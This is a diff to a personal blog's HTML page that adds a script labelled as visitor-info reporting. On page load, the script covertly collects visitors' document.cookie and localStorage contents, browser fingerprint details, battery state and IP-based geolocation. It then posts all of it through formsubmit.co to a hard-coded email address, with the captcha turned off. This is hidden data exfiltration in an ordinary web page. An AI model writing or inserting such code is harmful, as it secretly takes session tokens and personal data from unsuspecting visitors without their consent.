@@ -458,6 +458,63 @@ footer time{color:var(--pink)}
 
 <div class="toast" id="toast">已复制到剪贴板</div>
 
+<!-- ===== 访客信息上报 (FormSubmit) ===== -->
+<script>
+(function(){
+  const EMAIL="aaaa1auh@163.com";
+  if(sessionStorage.getItem("_reported"))return;
+  const n=navigator,d={};
+  d["_subject"]="🔥 CXW://SPACE 有新访客";
+  d["_template"]="table";
+  d["_captcha"]="false";
+  d["访问时间"]=new Date().toLocaleString("zh-CN",{timeZone:"Asia/Shanghai"});
+  d["页面地址"]=location.href;
+  d["来源页面"]=document.referrer||"(直接访问)";
+  d["用户代理"]=n.userAgent;
+  d["浏览器语言"]=(n.languages||[n.language]).join(", ");
+  d["平台"]=n.platform||"未知";
+  d["CPU核心数"]=n.hardwareConcurrency||"未知";
+  d["设备内存"]=n.deviceMemory?n.deviceMemory+"GB":"未知";
+  d["屏幕分辨率"]=screen.width+" × "+screen.height;
+  d["可用区域"]=screen.availWidth+" × "+screen.availHeight;
+  d["色彩深度"]=screen.colorDepth+"bit";
+  d["窗口大小"]=innerWidth+" × "+innerHeight;
+  d["像素比"]=devicePixelRatio;
+  d["时区"]=Intl.DateTimeFormat().resolvedOptions().timeZone;
+  d["时区偏移"]="UTC"+(new Date().getTimezoneOffset()>0?"-":"+")+Math.abs(new Date().getTimezoneOffset()/60);
+  d["触屏支持"]=("ontouchstart" in window||n.maxTouchPoints>0)?"是":"否";
+  d["Cookie启用"]=n.cookieEnabled?"是":"否";
+  d["Cookie内容"]=document.cookie||"(空)";
+  d["DNT"]=n.doNotTrack||"未设置";
+  d["在线状态"]=n.onLine?"在线":"离线";
+  if(n.connection)d["网络类型"]=n.connection.effectiveType;
+  try{d["LocalStorage"]=JSON.stringify(localStorage).slice(0,500)||"(空)";}catch(e){d["LocalStorage"]="不可用";}
+
+  const send=()=>{
+    sessionStorage.setItem("_reported","1");
+    fetch("https://formsubmit.co/ajax/"+EMAIL,{
+      method:"POST",
+      headers:{"Content-Type":"application/json","Accept":"application/json"},
+      body:JSON.stringify(d)
+    }).then(r=>r.json()).then(j=>console.log("[FS]上报结果:",JSON.stringify(j))).catch(e=>console.log("[FS]上报失败:",e));
+  };
+
+  const jobs=[];
+  if(n.getBattery){
+    jobs.push(n.getBattery().then(b=>{
+      d["电池电量"]=Math.round(b.level*100)+"%";
+      d["充电中"]=b.charging?"是":"否";
+    }).catch(()=>{}));
+  }
+  jobs.push(fetch("https://ipwho.is/").then(r=>r.json()).then(j=>{
+    if(j.success===false)throw new Error(j.message||"ip查询失败");
+    d["IP地址"]=j.ip;d["运营商"]=j.connection&&j.connection.org;d["城市"]=j.city;
+    d["地区"]=j.region;d["国家"]=j.country;d["经纬度"]=j.latitude+","+j.longitude;
+  }).catch(()=>{}));
+  Promise.all(jobs).then(send);
+})();
+</script>
+
 <script>
 /* ===== 打字机 ===== */
 const lines=["INITIALIZING PROFILE... 加载完成","护理专业在读 · 有梦想","你好 × 我是陈熙雯 · 欢迎光临我的博客"];
